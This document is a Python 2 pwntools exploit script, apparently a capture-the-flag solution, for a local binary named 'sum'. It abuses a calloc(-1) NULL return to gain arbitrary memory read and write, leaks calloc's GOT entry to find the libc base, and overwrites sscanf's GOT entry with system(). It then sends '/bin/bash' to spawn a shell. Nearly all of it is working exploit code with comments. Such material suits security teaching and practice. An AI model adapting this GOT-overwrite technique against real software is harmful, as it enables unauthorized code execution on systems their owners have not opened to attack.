#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sum
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('sum')
context.terminal = "terminator -x".split()
#context.log_level = 'debug'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *(0x{exe.symbols.calculator:x}+185)
break *(0x{exe.symbols.calculator:x}+432)
continue
'''.format(**locals())

io = start()

def get_prompt():
    msg = io.recvuntil("\n> ")

# Specify "-1" as a number of values, so that the calloc() returns NULL.
get_prompt()
io.sendline("-1")

def write_mem(addr, value):
    # Wait for the prompt
    get_prompt()
    io.sendline("set %ld %ld" % (addr/8, value))

def read_mem(addr):
    # Wait for the prompt
    get_prompt()
    io.sendline("get %ld" % (addr/8))
    l = io.recvline()
    print("line<%s>" % l)
    return int(l)


# Read the GOT entry of any symbol that has already been resolved by
# the dynamic linker, for instance calloc(). Note that exe.got["calloc"]
# is the address of the GOT entry for calloc()
calloc_addr = read_mem(exe.got['calloc'])
print("got.calloc@0x%x=0x%x" % (exe.got['calloc'], calloc_addr))

# Now, read the symbols table of the libc, looking for the addresses (offsets)
# of calloc() and system().
libc = context.binary = ELF('/usr/lib/libc.so.6')
calloc_ofs = libc.symbols['__libc_calloc']
system_ofs = libc.symbols['__libc_system']

# Compute the base address where the libc is loaded for the sum program.
libc_base = calloc_addr - calloc_ofs

# Now we can rewrite the GOT entry of sscanf() with the address of
# system() within the libc. In this way, in the next iteration of
# the calculator() loop, the first call to sscanf() will actually
# result into calling system(). The system() argument is the
# input line that would have gone to the sscanf().
write_mem(exe.got['__isoc99_sscanf'], libc_base + system_ofs)

# Send the input argument for sscanf(), which is now actually a
# system(). This will give us a shell.
io.sendline("/bin/bash")

io.interactive()
